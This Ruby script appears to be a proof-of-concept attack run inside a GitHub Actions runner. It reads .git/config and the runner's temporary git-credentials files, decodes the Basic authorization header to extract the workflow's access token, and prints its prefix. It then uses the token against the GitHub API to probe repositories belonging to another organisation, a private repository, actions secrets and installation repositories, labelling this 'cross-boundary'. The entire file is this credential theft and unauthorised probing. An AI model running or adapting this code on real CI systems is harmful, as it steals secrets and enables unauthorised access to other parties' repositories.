require 'net/http'
require 'json'

$stdout.puts "=== TOKEN EXTRACTION FROM GIT CREDENTIALS ==="

token = nil

git_config = File.read(".git/config") rescue ""
cred_paths = git_config.scan(/path\s*=\s*(.+)/).flatten.uniq

$stdout.puts "Credential file paths found: #{cred_paths.length}"
cred_paths.each do |p|
  p = p.strip
  $stdout.puts "Trying: #{p}"
  if File.exist?(p)
    content = File.read(p)
    $stdout.puts "  File exists, size=#{content.length}"
    if content =~ /AUTHORIZATION:\s*basic\s+(\S+)/i
      b64 = $1
      decoded = [b64].pack("H*") rescue nil
      decoded ||= begin; require 'base64'; Base64.decode64(b64); rescue; b64; end
      if decoded =~ /x-access-token:(.+)/
        token = $1.strip
        $stdout.puts "  TOKEN FOUND"
        $stdout.puts "  Token length: #{token.length}"
        $stdout.puts "  Token prefix: #{token[0..3]}..."
      else
        $stdout.puts "  Decoded but no x-access-token pattern"
        $stdout.puts "  Decoded length: #{decoded.length}"
        $stdout.puts "  Has ghs_: #{decoded.include?('ghs_')}"
      end
    else
      $stdout.puts "  No AUTHORIZATION header found"
      content.lines.each { |l| $stdout.puts "  line: #{l.strip[0..60]}" }
    end
  else
    $stdout.puts "  File not found"
  end
end

Dir.glob("/home/runner/work/_temp/git-credentials*").each do |f|
  $stdout.puts "Glob found: #{f}"
  content = File.read(f) rescue "unreadable"
  $stdout.puts "  size=#{content.length}"
end

if token
  $stdout.puts ""
  $stdout.puts "=== CROSS-BOUNDARY WITH EXTRACTED TOKEN ==="

  http = Net::HTTP.new("api.github.com", 443)
  http.use_ssl = true

  req = Net::HTTP::Get.new("/repos/github/explore")
  req["Authorization"] = "Bearer #{token}"
  req["Accept"] = "application/vnd.github+json"
  res = http.request(req)
  $stdout.puts "GET /repos/github/explore: #{res.code}"
  $stdout.puts "X-OAuth-Scopes: #{res['X-OAuth-Scopes']}"

  req2 = Net::HTTP::Get.new("/orgs/github/repos?type=all&per_page=3")
  req2["Authorization"] = "Bearer #{token}"
  req2["Accept"] = "application/vnd.github+json"
  res2 = http.request(req2)
  $stdout.puts "GET /orgs/github/repos?type=all: #{res2.code}"
  if res2.code == "200"
    JSON.parse(res2.body).each { |r| $stdout.puts "  #{r['full_name']} private=#{r['private']}" }
  end

  req3 = Net::HTTP::Get.new("/repos/github/github")
  req3["Authorization"] = "Bearer #{token}"
  req3["Accept"] = "application/vnd.github+json"
  res3 = http.request(req3)
  $stdout.puts "GET /repos/github/github: #{res3.code}"

  req4 = Net::HTTP::Get.new("/repos/github/explore/actions/secrets")
  req4["Authorization"] = "Bearer #{token}"
  req4["Accept"] = "application/vnd.github+json"
  res4 = http.request(req4)
  $stdout.puts "GET /repos/github/explore/actions/secrets: #{res4.code}"
  if res4.code == "200"
    d = JSON.parse(res4.body)
    $stdout.puts "  total: #{d['total_count']}"
    d['secrets']&.each { |s| $stdout.puts "  name: #{s['name']}" }
  end

  req5 = Net::HTTP::Get.new("/installation/repositories?per_page=5")
  req5["Authorization"] = "Bearer #{token}"
  req5["Accept"] = "application/vnd.github+json"
  res5 = http.request(req5)
  $stdout.puts "GET /installation/repositories: #{res5.code}"
  if res5.code == "200"
    d5 = JSON.parse(res5.body)
    $stdout.puts "  total: #{d5['total_count']}"
    d5['repositories']&.first(5)&.each { |r| $stdout.puts "  #{r['full_name']} private=#{r['private']}" }
  end
else
  $stdout.puts ""
  $stdout.puts "NO TOKEN EXTRACTED - cannot test cross-boundary"
end

$stdout.puts "=== END ==="
$stdout.flush